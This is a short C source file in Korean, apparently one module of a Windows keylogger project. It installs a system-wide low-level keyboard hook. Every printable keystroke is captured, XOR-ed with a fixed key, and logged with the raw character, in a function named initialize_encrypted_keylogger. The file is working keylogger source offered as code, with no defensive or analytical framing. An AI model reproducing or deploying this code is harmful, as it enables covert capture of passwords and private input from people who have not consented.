#include <windows.h>
#include <stdio.h>
#include "../include/input_encrypt.h"
#include "../include/logger.h"

static HHOOK hKeyHook = NULL;
static const char XOR_KEY = 0x5A; // 간단한 XOR 키

// 키코드 → 문자 변환
static char vk_to_char(KBDLLHOOKSTRUCT *kbStruct)
{
    BYTE keyboard_state[256];
    GetKeyboardState(keyboard_state);

    char buffer[2] = {0};
    UINT scanCode = MapVirtualKey(kbStruct->vkCode, MAPVK_VK_TO_VSC);
    ToAscii(kbStruct->vkCode, scanCode, keyboard_state, (LPWORD)buffer, 0);
    return buffer[0];
}

// 키 입력 훅 콜백
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
        char inputChar = vk_to_char(p);

        if (inputChar >= 32 && inputChar <= 126)
        {
            char encrypted = inputChar ^ XOR_KEY;

            char log_msg[128];
            snprintf(log_msg, sizeof(log_msg),
                     "[Encrypted Key] Raw: %c (0x%02X), Encrypted: 0x%02X",
                     inputChar, inputChar, encrypted);
            write_log(log_msg);
        }
    }

    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

void initialize_encrypted_keylogger(void)
{
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (hKeyHook == NULL)
    {
        write_log("[ERROR] 키보드 후킹 설치 실패 (암호화 입력 감지 불가).");
    }
    else
    {
        write_log("[INFO] 키보드 암호화 입력 훅 설치 완료.");
    }
}
